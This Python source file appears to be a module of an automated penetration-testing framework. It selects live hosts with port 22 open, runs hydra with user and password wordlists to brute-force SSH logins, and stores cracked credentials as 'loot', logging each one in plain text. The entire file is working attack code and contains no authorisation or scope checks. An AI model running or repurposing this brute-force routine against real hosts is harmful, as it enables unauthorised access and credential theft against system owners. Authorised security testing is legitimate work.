import os
from core.executor import safe_run
from core.logger import get_logger
from core.utils import make_out_dir, extract_credentials
from config import get_profile, tool_available, get_password_wordlist, get_user_wordlist

def run(ctx):
    log = get_logger(); log.banner("SERVICE -- SSH Brute Force"); log.set_phase("ssh_brute")
    profile = get_profile()
    targets = [h for h in ctx.live_hosts if 22 in ctx.open_ports.get(h,{}).get("tcp",[])]
    if not targets: return
    user_wl = get_user_wordlist()
    pass_wl = "/home/ubuntu_user/ris602/wordlists/passwords_fast.txt"
    for host in targets:
        out_dir = make_out_dir(ctx.out_dir, "services", "ssh", host)
        log.info(f"SSH brute: {host}")
        if tool_available("hydra"):
            rc, out, _ = safe_run(
                f"hydra -L {user_wl} -P {pass_wl} -t {profile['hydra_tasks']} -f -V {host} ssh",
                timeout=profile["timeout_cmd"], label=f"hydra-ssh-{host}"
            )
            with open(os.path.join(out_dir,"hydra_ssh.txt"),"w") as f: f.write(out)
            for c in extract_credentials(out):
                c["service"]="ssh"; c["host"]=host
                ctx.loot.setdefault("credentials",[]).append(c)
                ctx.add_finding("CRITICAL", host, f"SSH cred: {c['user']}:{c['password']}", "")
                log.success(f"  SSH cred found: {c['user']}:{c['password']}")
